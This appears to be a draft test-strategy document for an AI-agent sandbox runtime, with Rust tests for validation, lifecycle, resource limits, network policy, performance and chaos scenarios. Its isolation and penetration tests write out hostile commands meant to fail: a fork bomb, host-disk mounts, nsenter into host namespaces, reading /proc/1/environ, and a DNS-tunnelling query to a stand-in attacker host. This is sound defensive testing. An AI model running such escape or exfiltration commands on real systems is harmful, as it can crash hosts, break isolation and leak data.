---
status: draft
author: Claude
created: 2025-12-25
updated: 2025-12-25
reviewers: []
github_issue: "#TBD"
oss_reference: kubernetes-sigs/agent-sandbox
---

# RTM-06: Runtime Testing Strategy

## Table of Contents
1. [Testing Pyramid](#testing-pyramid)
2. [Unit Tests](#unit-tests)
3. [Integration Tests](#integration-tests)
4. [Isolation Tests](#isolation-tests)
5. [Performance Tests](#performance-tests)
6. [Security Tests](#security-tests)
7. [Chaos Engineering](#chaos-engineering)
8. [Test Coverage Requirements](#test-coverage-requirements)

---

## Testing Pyramid

```
                    ┌─────────────┐
                    │   Manual    │ (5%)
                    │ Exploratory │
                    └─────────────┘
                ┌─────────────────────┐
                │  End-to-End Tests   │ (10%)
                │  - Full workflows   │
                │  - Multi-sandbox    │
                └─────────────────────┘
            ┌───────────────────────────┐
            │   Integration Tests       │ (25%)
            │  - Component boundaries   │
            │  - External dependencies  │
            └───────────────────────────┘
        ┌─────────────────────────────────┐
        │      Isolation Tests            │ (30%)
        │  - Sandbox escape attempts      │
        │  - Resource isolation           │
        │  - Network enforcement          │
        └─────────────────────────────────┘
    ┌──────────────────────────────────────┐
    │         Unit Tests                   │ (30%)
    │  - Function-level logic              │
    │  - Error handling                    │
    │  - Edge cases                        │
    └──────────────────────────────────────┘
```

**Test Distribution**:
- **Unit Tests (30%)**: 1000+ tests, <100ms each
- **Isolation Tests (30%)**: 200+ tests, <10s each
- **Integration Tests (25%)**: 100+ tests, <60s each
- **E2E Tests (10%)**: 20+ tests, <5min each
- **Manual Testing (5%)**: Security audits, penetration tests

---

## Unit Tests

### SandboxSpec Validation

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_sandbox_spec() {
        let spec = SandboxSpec {
            image: "python:3.11".into(),
            agent_nhi: test_agent_identity(),
            delegation_chain: vec![],
            runtime_class: RuntimeClass::GVisor,
            resource_limits: ResourceLimits::default(),
            network_policy: NetworkPolicy::default_deny(),
            secrets: vec![],
            ttl: Some(Duration::from_secs(3600)),
            idle_timeout: None,
        };

        assert!(spec.validate().is_ok());
    }

    #[test]
    fn test_invalid_ttl() {
        let spec = SandboxSpec {
            ttl: Some(Duration::from_secs(30)),  // < 60s minimum
            ..test_valid_spec()
        };

        let err = spec.validate().unwrap_err();
        assert!(matches!(err, ValidationError::InvalidTtl { .. }));
    }

    #[test]
    fn test_invalid_cpu_limit() {
        let spec = SandboxSpec {
            resource_limits: ResourceLimits {
                cpu_millicores: 0,  // Must be > 0
                ..Default::default()
            },
            ..test_valid_spec()
        };

        let err = spec.validate().unwrap_err();
        assert!(matches!(err, ValidationError::InvalidResourceLimit { .. }));
    }

    #[test]
    fn test_empty_image() {
        let spec = SandboxSpec {
            image: "".into(),
            ..test_valid_spec()
        };

        let err = spec.validate().unwrap_err();
        assert!(matches!(err, ValidationError::EmptyImage));
    }
}
```

---

### NetworkPolicy Evaluation

```rust
#[cfg(test)]
mod network_policy_tests {
    use super::*;

    #[test]
    fn test_cidr_block_match() {
        let policy = NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                EgressRule {
                    destination: EgressDestination::CidrBlock("10.0.0.0/8".parse().unwrap()),
                    action: NetworkAction::Allow,
                },
            ],
            dns_policy: None,
        };

        // Should match 10.0.0.0/8
        let dest = "10.5.100.50".parse().unwrap();
        assert_eq!(policy.evaluate_egress(&dest), NetworkAction::Allow);

        // Should not match (default deny)
        let dest = "192.168.1.1".parse().unwrap();
        assert_eq!(policy.evaluate_egress(&dest), NetworkAction::Deny);
    }

    #[test]
    fn test_domain_wildcard_match() {
        let policy = NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                EgressRule {
                    destination: EgressDestination::Domain("*.anthropic.com".into()),
                    action: NetworkAction::RequireAuthz,
                },
            ],
            dns_policy: None,
        };

        assert_eq!(
            policy.evaluate_egress_domain("api.anthropic.com"),
            NetworkAction::RequireAuthz
        );

        assert_eq!(
            policy.evaluate_egress_domain("claude.anthropic.com"),
            NetworkAction::RequireAuthz
        );

        assert_eq!(
            policy.evaluate_egress_domain("anthropic.com"),
            NetworkAction::Deny  // Doesn't match wildcard
        );

        assert_eq!(
            policy.evaluate_egress_domain("evil.com"),
            NetworkAction::Deny
        );
    }

    #[test]
    fn test_rule_priority() {
        let policy = NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                // First rule matches: Deny
                EgressRule {
                    destination: EgressDestination::DomainExact("blocked.example.com".into()),
                    action: NetworkAction::Deny,
                },
                // Second rule would match but first takes precedence
                EgressRule {
                    destination: EgressDestination::Domain("*.example.com".into()),
                    action: NetworkAction::Allow,
                },
            ],
            dns_policy: None,
        };

        // First rule matches: Deny
        assert_eq!(
            policy.evaluate_egress_domain("blocked.example.com"),
            NetworkAction::Deny
        );

        // Second rule matches: Allow
        assert_eq!(
            policy.evaluate_egress_domain("api.example.com"),
            NetworkAction::Allow
        );
    }
}
```

---

### Attestation Signature

```rust
#[cfg(test)]
mod attestation_tests {
    use super::*;

    #[tokio::test]
    async fn test_attestation_signature() {
        let service = AttestationService::new_for_test().await;

        let attestation = Attestation {
            sandbox_id: SandboxId::from("sb-test-123"),
            agent_nhi: test_agent_identity(),
            delegation_chain: vec![],
            image_hash: Hash([0u8; 32]),
            config_hash: Hash([0u8; 32]),
            init_hash: Hash([0u8; 32]),
            platform: AttestationPlatform::GVisor { version: "v1.0.0".into() },
            platform_evidence: vec![],
            created_at: Timestamp::now(),
            valid_until: Timestamp::now() + Duration::from_secs(3600),
            signature: Signature::default(),
        };

        // Sign
        let signed = service.sign(attestation).await.unwrap();

        // Verify
        let result = service.verify(&signed).await.unwrap();
        assert!(matches!(result, VerificationResult::Valid { .. }));
    }

    #[tokio::test]
    async fn test_attestation_tampering_detection() {
        let service = AttestationService::new_for_test().await;

        let attestation = test_attestation();
        let mut signed = service.sign(attestation).await.unwrap();

        // Tamper with image hash
        signed.image_hash = Hash([0xFFu8; 32]);

        // Verify should fail
        let result = service.verify(&signed).await.unwrap();
        assert!(matches!(result, VerificationResult::Invalid { .. }));
    }

    #[tokio::test]
    async fn test_attestation_expiration() {
        let service = AttestationService::new_for_test().await;

        let attestation = Attestation {
            valid_until: Timestamp::now() - Duration::from_secs(1),  // Expired 1s ago
            ..test_attestation()
        };

        let signed = service.sign(attestation).await.unwrap();
        let result = service.verify(&signed).await.unwrap();
        assert!(matches!(result, VerificationResult::Expired));
    }
}
```

---

## Integration Tests

### Sandbox Lifecycle

```rust
#[tokio::test]
async fn test_sandbox_lifecycle() {
    let runtime = test_runtime().await;

    // Spawn
    let spec = test_sandbox_spec();
    let handle = runtime.spawn(&spec).await.expect("spawn failed");
    assert_eq!(handle.status, SandboxStatus::Ready);

    // Status query
    let status = runtime.status(&handle.id).await.expect("status failed");
    assert!(matches!(status, SandboxStatus::Ready));

    // Execute command
    let output = runtime.exec(
        &handle.id,
        Command::new("echo").arg("Hello, World!"),
    ).await.expect("exec failed");
    assert_eq!(output.stdout_str().unwrap().trim(), "Hello, World!");
    assert_eq!(output.exit_code, 0);

    // Terminate
    runtime.terminate(&handle.id).await.expect("terminate failed");

    // Verify terminated
    let status = runtime.status(&handle.id).await.expect("status failed");
    assert!(matches!(status, SandboxStatus::Terminated { .. }));
}
```

---

### Warm Pool Claim

```rust
#[tokio::test]
async fn test_warmpool_claim_latency() {
    let pool_manager = test_pool_manager().await;

    // Create pool
    let pool_id = pool_manager.create_pool(WarmPoolConfig {
        id: PoolId::from("test-pool"),
        template: test_sandbox_spec(),
        min_ready: 5,
        max_ready: 10,
        max_age: Duration::from_secs(3600),
        reusable: true,
        auto_scaling: None,
    }).await.expect("create_pool failed");

    // Wait for pool to warm
    tokio::time::sleep(Duration::from_secs(10)).await;

    // Measure claim latency
    let start = Instant::now();
    let handle = pool_manager.claim(
        &pool_id,
        &test_agent_identity(),
        &[],
    ).await.expect("claim failed");
    let latency = start.elapsed();

    // Assert <100ms (p99 target)
    assert!(
        latency < Duration::from_millis(100),
        "Claim took {:?}, expected <100ms",
        latency
    );

    // Release
    pool_manager.release(&handle.id, true).await.expect("release failed");
}
```

---

### Checkpoint and Restore

```rust
#[tokio::test]
async fn test_checkpoint_restore() {
    let runtime = test_runtime().await;

    // Spawn sandbox
    let spec = test_sandbox_spec();
    let handle = runtime.spawn(&spec).await.unwrap();

    // Write state
    runtime.exec(
        &handle.id,
        Command::new("bash").arg("-c").arg("echo hello > /tmp/state.txt"),
    ).await.unwrap();

    // Checkpoint
    let checkpoint_id = runtime.checkpoint(&handle.id).await.expect("checkpoint failed");

    // Terminate original sandbox
    runtime.terminate(&handle.id).await.unwrap();

    // Restore from checkpoint
    let restored_handle = runtime.restore(&checkpoint_id, None).await.expect("restore failed");

    // Verify state persisted
    let output = runtime.exec(
        &restored_handle.id,
        Command::new("cat").arg("/tmp/state.txt"),
    ).await.unwrap();

    assert_eq!(output.stdout_str().unwrap().trim(), "hello");

    // Cleanup
    runtime.terminate(&restored_handle.id).await.unwrap();
}
```

---

## Isolation Tests

### Sandbox Escape Prevention

```rust
#[tokio::test]
async fn test_sandbox_escape_mount_attack() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Attempt to mount host disk
    let output = runtime.exec(
        &handle.id,
        Command::new("mount").args(&["/dev/sda1", "/mnt"]),
    ).await;

    // Should fail (no CAP_SYS_ADMIN)
    assert!(output.is_err() || output.unwrap().exit_code != 0);

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_sandbox_escape_proc_access() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Attempt to read host PID 1 environ
    let output = runtime.exec(
        &handle.id,
        Command::new("cat").arg("/proc/1/environ"),
    ).await;

    // Should fail or return sandbox init's environ (not host PID 1)
    if let Ok(output) = output {
        // If successful, should not contain host-specific env vars
        let env_str = output.stdout_str().unwrap();
        assert!(!env_str.contains("HOST_SPECIFIC_VAR"));
    }

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_sandbox_escape_namespace_enter() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Attempt nsenter to host namespace
    let output = runtime.exec(
        &handle.id,
        Command::new("nsenter").args(&["-t", "1", "-m", "-u", "-i", "-n", "-p", "/bin/sh", "-c", "hostname"]),
    ).await;

    // Should fail (nsenter not available or lacks permissions)
    assert!(output.is_err() || output.unwrap().exit_code != 0);

    runtime.terminate(&handle.id).await.unwrap();
}
```

---

### Resource Isolation

```rust
#[tokio::test]
async fn test_memory_isolation() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        resource_limits: ResourceLimits {
            memory_bytes: 100 * 1024 * 1024,  // 100MB
            ..Default::default()
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Attempt to allocate 200MB (should OOM kill sandbox)
    let output = runtime.exec(
        &handle.id,
        Command::new("python3").args(&[
            "-c",
            "x = bytearray(200 * 1024 * 1024)",  // 200MB allocation
        ]).timeout(Duration::from_secs(30)),
    ).await;

    // Should fail (OOM killed)
    assert!(output.is_err() || output.unwrap().exit_code != 0);

    // Host should still be responsive
    assert!(runtime.health_check().await.is_ok());

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_cpu_isolation() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        resource_limits: ResourceLimits {
            cpu_millicores: 1000,  // 1 CPU
            ..Default::default()
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Spawn CPU-intensive task
    let _output = runtime.exec(
        &handle.id,
        Command::new("bash").args(&[
            "-c",
            "for i in {1..4}; do (while true; do :; done) & done; sleep 10",
        ]),
    ).await;

    // Check resource usage
    let info = runtime.get_info(&handle.id).await.unwrap();

    // CPU usage should be capped at ~100% (1 CPU)
    // Allow some overhead for cgroup accounting
    assert!(
        info.resource_usage.cpu_usage < 150.0,
        "CPU usage {} exceeds limit",
        info.resource_usage.cpu_usage
    );

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_pid_isolation() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        resource_limits: ResourceLimits {
            pid_limit: 100,
            ..Default::default()
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Attempt fork bomb
    let output = runtime.exec(
        &handle.id,
        Command::new("bash").args(&[
            "-c",
            ":(){ :|:& };:",  // Fork bomb
        ]).timeout(Duration::from_secs(10)),
    ).await;

    // Should fail (PID limit exceeded)
    assert!(output.is_err());

    // Sandbox should be killed
    let status = runtime.status(&handle.id).await.unwrap();
    assert!(matches!(status, SandboxStatus::Terminated { .. } | SandboxStatus::Failed { .. }));
}
```

---

### Network Isolation

```rust
#[tokio::test]
async fn test_network_egress_allow() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                EgressRule {
                    destination: EgressDestination::Domain("httpbin.org".into()),
                    action: NetworkAction::Allow,
                },
            ],
            dns_policy: Some(DnsPolicy {
                allowed_resolvers: vec!["8.8.8.8".parse().unwrap()],
                blocked_domains: vec![],
                require_authz_domains: vec![],
            }),
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Allowed destination should succeed
    let output = runtime.exec(
        &handle.id,
        Command::new("curl").args(&["-s", "http://httpbin.org/get"]),
    ).await.unwrap();

    assert_eq!(output.exit_code, 0);

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_network_egress_deny() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![],
            dns_policy: Some(DnsPolicy {
                allowed_resolvers: vec!["8.8.8.8".parse().unwrap()],
                blocked_domains: vec![],
                require_authz_domains: vec![],
            }),
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Denied destination should fail
    let output = runtime.exec(
        &handle.id,
        Command::new("curl").args(&["-s", "--max-time", "5", "http://httpbin.org/get"]),
    ).await;

    assert!(output.is_err() || output.unwrap().exit_code != 0);

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn test_dns_policy_enforcement() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Allow,
            egress_rules: vec![],
            dns_policy: Some(DnsPolicy {
                allowed_resolvers: vec!["8.8.8.8".parse().unwrap()],
                blocked_domains: vec!["evil.com".into()],
                require_authz_domains: vec![],
            }),
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Blocked domain should fail DNS resolution
    let output = runtime.exec(
        &handle.id,
        Command::new("dig").args(&["evil.com", "+short"]),
    ).await;

    // DNS query should fail or return empty
    if let Ok(output) = output {
        assert!(output.stdout.is_empty() || output.exit_code != 0);
    }

    runtime.terminate(&handle.id).await.unwrap();
}
```

---

## Performance Tests

### Cold Spawn Latency

```rust
#[tokio::test]
async fn bench_cold_spawn_gvisor() {
    let runtime = test_runtime_gvisor().await;
    let mut latencies = Vec::new();

    for _ in 0..100 {
        let start = Instant::now();
        let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();
        let latency = start.elapsed();
        latencies.push(latency);

        runtime.terminate(&handle.id).await.unwrap();
    }

    latencies.sort();
    let p50 = latencies[49];
    let p99 = latencies[98];

    println!("gVisor cold spawn - p50: {:?}, p99: {:?}", p50, p99);

    // Assert p99 < 2s
    assert!(
        p99 < Duration::from_secs(2),
        "p99 latency {:?} exceeds target 2s",
        p99
    );
}

#[tokio::test]
async fn bench_cold_spawn_kata() {
    let runtime = test_runtime_kata().await;
    let mut latencies = Vec::new();

    for _ in 0..50 {  // Fewer iterations (Kata slower)
        let start = Instant::now();
        let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();
        let latency = start.elapsed();
        latencies.push(latency);

        runtime.terminate(&handle.id).await.unwrap();
    }

    latencies.sort();
    let p50 = latencies[24];
    let p99 = latencies[49];

    println!("Kata cold spawn - p50: {:?}, p99: {:?}", p50, p99);

    // Assert p99 < 5s
    assert!(
        p99 < Duration::from_secs(5),
        "p99 latency {:?} exceeds target 5s",
        p99
    );
}
```

---

### Warm Pool Claim Latency

```rust
#[tokio::test]
async fn bench_warmpool_claim_latency() {
    let pool_manager = test_pool_manager().await;

    // Create pool with 20 ready sandboxes
    let pool_id = pool_manager.create_pool(WarmPoolConfig {
        id: PoolId::from("bench-pool"),
        template: test_sandbox_spec(),
        min_ready: 20,
        max_ready: 20,
        max_age: Duration::from_secs(3600),
        reusable: true,
        auto_scaling: None,
    }).await.unwrap();

    // Wait for pool to warm
    tokio::time::sleep(Duration::from_secs(30)).await;

    // Benchmark claim latency
    let mut latencies = Vec::new();
    for _ in 0..100 {
        let start = Instant::now();
        let handle = pool_manager.claim(
            &pool_id,
            &test_agent_identity(),
            &[],
        ).await.unwrap();
        let latency = start.elapsed();
        latencies.push(latency);

        pool_manager.release(&handle.id, true).await.unwrap();
    }

    latencies.sort();
    let p50 = latencies[49];
    let p99 = latencies[98];

    println!("Warm pool claim - p50: {:?}, p99: {:?}", p50, p99);

    // Assert p99 < 100ms
    assert!(
        p99 < Duration::from_millis(100),
        "p99 latency {:?} exceeds target 100ms",
        p99
    );
}
```

---

### Egress Check Latency

```rust
#[tokio::test]
async fn bench_egress_check_latency() {
    let egress_controller = test_egress_controller().await;
    let sandbox_id = SandboxId::from("sb-bench");

    let mut latencies = Vec::new();
    for _ in 0..10000 {
        let start = Instant::now();
        let _decision = egress_controller.check_egress(
            &sandbox_id,
            &EgressDestination::Domain("api.anthropic.com".into()),
        ).await.unwrap();
        let latency = start.elapsed();
        latencies.push(latency);
    }

    latencies.sort();
    let p50 = latencies[4999];
    let p99 = latencies[9899];

    println!("Egress check - p50: {:?}, p99: {:?}", p50, p99);

    // Assert p99 < 1ms
    assert!(
        p99 < Duration::from_millis(1),
        "p99 latency {:?} exceeds target 1ms",
        p99
    );
}
```

---

### Concurrent Sandboxes

```rust
#[tokio::test]
async fn test_concurrent_sandboxes() {
    let runtime = test_runtime().await;

    // Spawn 100 sandboxes concurrently
    let handles = futures::stream::iter(0..100)
        .map(|_| runtime.spawn(&test_sandbox_spec()))
        .buffer_unordered(20)  // 20 concurrent spawns
        .try_collect::<Vec<_>>()
        .await
        .expect("concurrent spawn failed");

    assert_eq!(handles.len(), 100);

    // All should be in Ready state
    for handle in &handles {
        assert_eq!(handle.status, SandboxStatus::Ready);
    }

    // Terminate all
    futures::stream::iter(&handles)
        .map(|h| runtime.terminate(&h.id))
        .buffer_unordered(20)
        .try_collect::<Vec<_>>()
        .await
        .expect("concurrent terminate failed");
}
```

---

## Security Tests

### Penetration Testing

```rust
#[tokio::test]
async fn pentest_escape_via_privileged_docker() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Attempt to run privileged Docker container inside sandbox
    let output = runtime.exec(
        &handle.id,
        Command::new("docker").args(&["run", "--privileged", "alpine", "sh", "-c", "mount /dev/sda1 /mnt"]),
    ).await;

    // Should fail (Docker not available or lacks permissions)
    assert!(output.is_err());

    runtime.terminate(&handle.id).await.unwrap();
}

#[tokio::test]
async fn pentest_exfiltration_via_dns_tunneling() {
    let runtime = test_runtime().await;

    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![],
            dns_policy: Some(DnsPolicy {
                allowed_resolvers: vec!["8.8.8.8".parse().unwrap()],
                blocked_domains: vec![],
                require_authz_domains: vec![],
            }),
        },
        ..test_sandbox_spec()
    };

    let handle = runtime.spawn(&spec).await.unwrap();

    // Attempt DNS tunneling (encode data in subdomain)
    let output = runtime.exec(
        &handle.id,
        Command::new("dig").args(&["exfiltrated-data.attacker.com", "TXT"]),
    ).await;

    // DNS query should fail (default deny egress)
    assert!(output.is_err() || output.unwrap().exit_code != 0);

    runtime.terminate(&handle.id).await.unwrap();
}
```

---

## Chaos Engineering

### Network Partition

```rust
#[tokio::test]
async fn chaos_network_partition() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Simulate network partition (drop all egress packets)
    chaos::inject_network_partition(&handle.id).await;

    // Commands should fail due to network unavailability
    let output = runtime.exec(
        &handle.id,
        Command::new("curl").args(&["http://httpbin.org/get"]),
    ).await;

    assert!(output.is_err() || output.unwrap().exit_code != 0);

    // Restore network
    chaos::restore_network(&handle.id).await;

    // Commands should succeed again
    let output = runtime.exec(
        &handle.id,
        Command::new("echo").arg("test"),
    ).await.unwrap();

    assert_eq!(output.exit_code, 0);

    runtime.terminate(&handle.id).await.unwrap();
}
```

---

### Runtime Backend Failure

```rust
#[tokio::test]
async fn chaos_containerd_crash() {
    let runtime = test_runtime().await;
    let handle = runtime.spawn(&test_sandbox_spec()).await.unwrap();

    // Simulate containerd crash
    chaos::kill_containerd().await;

    // Runtime should detect failure
    let status = runtime.status(&handle.id).await;
    assert!(status.is_err());

    // Restart containerd
    chaos::restart_containerd().await;

    // New spawns should succeed after recovery
    let handle2 = runtime.spawn(&test_sandbox_spec()).await.unwrap();
    assert_eq!(handle2.status, SandboxStatus::Ready);

    runtime.terminate(&handle2.id).await.unwrap();
}
```

---

## Test Coverage Requirements

### Coverage Targets

| Component | Line Coverage | Branch Coverage | Notes |
|-----------|---------------|-----------------|-------|
| **SandboxManager** | ≥80% | ≥70% | Core lifecycle logic |
| **WarmPoolManager** | ≥80% | ≥70% | Claim/release paths |
| **EgressController** | ≥90% | ≥80% | Security-critical |
| **AttestationService** | ≥90% | ≥80% | Crypto verification |
| **NetworkPolicyManager** | ≥85% | ≥75% | Policy evaluation |
| **RuntimeAdapter** | ≥75% | ≥65% | Backend integration |

### Critical Paths (100% Coverage Required)

1. **Authorization Checks**: All spawn/exec must check authz
2. **Network Egress Enforcement**: All egress paths must enforce policy
3. **Attestation Signature**: Sign/verify must be covered
4. **Secret Cleanup**: Secrets must be zeroed on terminate
5. **Resource Limits**: cgroups enforcement must be tested

---

### CI/CD Integration

```yaml
# .github/workflows/test.yml
name: Runtime Tests

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions-rs/toolchain@v1
        with:
          toolchain: stable
      - run: cargo test --package creto-runtime --lib

  integration-tests:
    runs-on: ubuntu-latest
    services:
      etcd:
        image: quay.io/coreos/etcd:v3.5.0
        ports:
          - 2379:2379
    steps:
      - uses: actions/checkout@v3
      - run: cargo test --package creto-runtime --test integration

  isolation-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install gVisor
        run: |
          wget https://storage.googleapis.com/gvisor/releases/release/latest/runsc
          chmod +x runsc
          sudo mv runsc /usr/local/bin/
      - run: cargo test --package creto-runtime --test isolation -- --test-threads=1

  coverage:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: cargo tarpaulin --out Xml --timeout 300
      - name: Upload coverage
        uses: codecov/codecov-action@v3
```

---

## Revision History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2025-12-25 | 0.1 | Claude | Initial testing strategy |
